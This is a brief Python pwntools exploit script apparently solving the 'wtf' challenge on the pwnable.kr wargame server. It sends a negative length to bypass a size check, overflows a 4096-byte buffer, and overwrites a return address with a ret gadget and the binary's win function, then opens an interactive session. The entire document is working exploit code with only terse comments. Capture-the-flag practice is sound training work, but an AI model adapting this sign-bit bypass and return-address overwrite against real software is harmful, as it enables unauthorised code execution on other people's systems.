from pwn import *

elf = ELF("./wtf")
#io = process([elf.path])
io = remote('pwnable.kr',9015)

# set sign bit to 1 to bypass the length condition
payload = b"-1\n"
# and fill the buffer of 4096 bytes of printf
payload += b"A"*(4096-len(payload))

# Negative OOB allow us to overwrite a return address
ret_gadget=0x00000000004004a7
payload += b"A"*56 + p64(ret_gadget) + p64(elf.sym.win) + b"\n"

sleep(1)
io.recvuntil(b"payload please : ")
io.sendline(payload.hex())
io.interactive()
